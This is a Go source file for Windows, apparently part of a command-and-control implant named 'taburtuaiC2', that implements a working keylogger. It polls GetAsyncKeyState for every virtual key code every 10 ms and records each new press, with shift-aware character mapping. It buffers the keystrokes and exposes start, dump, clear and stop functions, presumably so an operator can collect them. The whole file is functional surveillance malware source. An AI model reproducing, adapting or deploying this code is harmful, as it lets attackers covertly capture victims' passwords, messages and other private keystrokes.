//go:build windows

package recon

import (
	"fmt"
	"strings"
	"sync"
	"time"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

var (
	keylogMu     sync.Mutex
	keylogBuf    strings.Builder
	keylogActive bool
	keylogStop   chan struct{}
)

var vkMap = map[int]string{
	0x08: "[BS]", 0x09: "\t", 0x0D: "\n", 0x1B: "[ESC]",
	0x20: " ", 0x2E: "[DEL]",
	0x30: "0", 0x31: "1", 0x32: "2", 0x33: "3", 0x34: "4",
	0x35: "5", 0x36: "6", 0x37: "7", 0x38: "8", 0x39: "9",
	0x41: "a", 0x42: "b", 0x43: "c", 0x44: "d", 0x45: "e",
	0x46: "f", 0x47: "g", 0x48: "h", 0x49: "i", 0x4A: "j",
	0x4B: "k", 0x4C: "l", 0x4D: "m", 0x4E: "n", 0x4F: "o",
	0x50: "p", 0x51: "q", 0x52: "r", 0x53: "s", 0x54: "t",
	0x55: "u", 0x56: "v", 0x57: "w", 0x58: "x", 0x59: "y",
	0x5A: "z",
	0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/",
	0xC0: "`", 0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'",
	0x60: "0", 0x61: "1", 0x62: "2", 0x63: "3", 0x64: "4",
	0x65: "5", 0x66: "6", 0x67: "7", 0x68: "8", 0x69: "9",
	0x6A: "*", 0x6B: "+", 0x6D: "-", 0x6E: ".", 0x6F: "/",
}

// StartKeylogger starts the polling keylogger goroutine.
func StartKeylogger() error {
	keylogMu.Lock()
	if keylogActive {
		keylogMu.Unlock()
		return fmt.Errorf("keylogger already running")
	}
	keylogActive = true
	keylogBuf.Reset()
	keylogStop = make(chan struct{})
	keylogMu.Unlock()

	go func() {
		prev := make([]bool, 256)
		for {
			select {
			case <-keylogStop:
				return
			default:
			}
			for vk := 0; vk < 256; vk++ {
				state, _, _ := winsyscall.ProcGetAsyncKeyState.Call(uintptr(vk))
				down := (state & 0x8000) != 0
				if down && !prev[vk] {
					appendKey(vk)
				}
				prev[vk] = down
			}
			time.Sleep(10 * time.Millisecond)
		}
	}()
	return nil
}

func appendKey(vk int) {
	shiftState, _, _ := winsyscall.ProcGetKeyState.Call(0x10)
	shifted := (shiftState & 0x8000) != 0

	var s string
	if str, ok := vkMap[vk]; ok {
		s = str
		if shifted {
			s = shiftChar(s)
		}
	}
	if s == "" {
		return
	}
	keylogMu.Lock()
	keylogBuf.WriteString(s)
	keylogMu.Unlock()
}

func shiftChar(s string) string {
	shifts := map[string]string{
		"a": "A", "b": "B", "c": "C", "d": "D", "e": "E",
		"f": "F", "g": "G", "h": "H", "i": "I", "j": "J",
		"k": "K", "l": "L", "m": "M", "n": "N", "o": "O",
		"p": "P", "q": "Q", "r": "R", "s": "S", "t": "T",
		"u": "U", "v": "V", "w": "W", "x": "X", "y": "Y",
		"z": "Z",
		"1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
		"6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
		"-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
		";": ":", "'": "\"", ",": "<", ".": ">", "/": "?",
		"`": "~",
	}
	if r, ok := shifts[s]; ok {
		return r
	}
	return strings.ToUpper(s)
}

// DumpKeylog returns buffered keystrokes.
func DumpKeylog() string {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	return keylogBuf.String()
}

// ClearKeylog clears the keylog buffer.
func ClearKeylog() {
	keylogMu.Lock()
	keylogBuf.Reset()
	keylogMu.Unlock()
}

// StopKeylogger stops the polling goroutine.
func StopKeylogger() {
	keylogMu.Lock()
	if !keylogActive {
		keylogMu.Unlock()
		return
	}
	keylogActive = false
	close(keylogStop)
	keylogMu.Unlock()
}
